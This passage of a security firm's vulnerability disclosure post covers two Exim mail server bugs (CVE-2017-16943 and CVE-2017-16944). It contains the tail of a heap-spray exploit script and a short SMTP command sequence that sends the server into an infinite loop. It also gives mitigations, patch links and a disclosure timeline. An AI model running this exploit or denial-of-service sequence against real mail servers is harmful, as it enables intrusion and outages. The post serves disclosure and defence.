<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">':BDAT </span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>A demo of our exploit is as below.<br />
<img src="/assets/img/blog/20171211/7-demo.png" alt="" /><br />
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.</p>

<h1 id="incorrect-bdat-data-handling-leads-to-dos">Incorrect BDAT data handling leads to DoS</h1>

<h3 id="vulnerability-analysis-1">Vulnerability Analysis</h3>
<p>When receiving data with BDAT command, SMTP server should not consider a single dot <code class="highlighter-rouge">‘.’</code> in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&lt;meh@some.domain&gt;
250 OK
RCPT TO:&lt;meh@some.domain&gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
</code></pre></div></div>
<p>As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer <code class="highlighter-rouge">receive_getc</code> is not reset. If the next command is also a BDAT, <code class="highlighter-rouge">receive_getc</code> and <code class="highlighter-rouge">lwr_receive_getc</code> become the same and an infinite loop occurs inside <code class="highlighter-rouge">bdat_getc</code>. Program crashes due to stack exhaustion.<br />
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546">smtp_in.c: 546 bdat_getc</a></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  if (chunking_data_left &gt; 0)
    return lwr_receive_getc(chunking_data_left--);
</code></pre></div></div>
<p>This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&lt;meh@some.domain&gt;
RCPT TO:&lt;meh@some.domain&gt;
BDAT 100
.
MAIL FROM:&lt;meh@some.domain&gt;
RCPT TO:&lt;meh@some.domain&gt;
BDAT 0 LAST
</code></pre></div></div>
<p>This makes attackers able to launch a resource based DoS attack and then force the whole server down.</p>

<h2 id="fix">Fix</h2>
<ul>
  <li>Turn off Chunking option in config file:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chunking_advertise_hosts =
</code></pre></div>    </div>
  </li>
  <li>Update to 4.89.1 version</li>
  <li>Patch of CVE-2017-16943 released <a href="https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde">here</a></li>
  <li>Patch of CVE-2017-16944 released <a href="https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542">here</a></li>
</ul>

<h2 id="timeline">Timeline</h2>

<ul>
  <li>23 November, 2017 09:40 Report to Exim Bugzilla</li>
  <li>25 November, 2017 16:27 CVE-2017-16943 Patch released</li>
  <li>28 November, 2017 16:27 CVE-2017-16944 Patch released</li>
  <li>3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now</li>
</ul>

<h4 id="remarks">Remarks</h4>
<p>While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.</p>

<h2 id="credits">Credits</h2>
<p>Vulnerabilities found by Meh, DEVCORE research team.<br />
meh [at] devco [dot] re</p>

<h2 id="reference">Reference</h2>

<p>https://bugs.exim.org/show_bug.cgi?id=2199<br />
https://bugs.exim.org/show_bug.cgi?id=2201<br />
https://nvd.nist.gov/vuln/detail/CVE-2017-16943<br />
https://nvd.nist.gov/vuln/detail/CVE-2017-16944<br />
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html</p>

              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="blog-author-name">Meh</a> 
              </div>
              <p class="blog-author-info">
                I am a pwner.
              </p>
          
              <div class="heading--side-lined">
                Comments
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">


        <div class="contact-section container">
          <h2 class="contact-section__title">
            Put your defenses to the test with authentic attacks
          </h2>
          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://plus.google.com/118439315679478709768/posts" class="main-footer__sns">
                <svg class="icon-googleplus icon"><use xlink:href="#icon-googleplus" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                10F., No.168, Fuxing N. Rd., Zhongshan Dist., Taipei City 10487, Taiwan (R.O.C.)
              </li>
              <li>
                contact@devco.re
              </li>
              <li>
                +886-2-2718-0156
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2018 DEVCORE</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>





  </body>
</html>




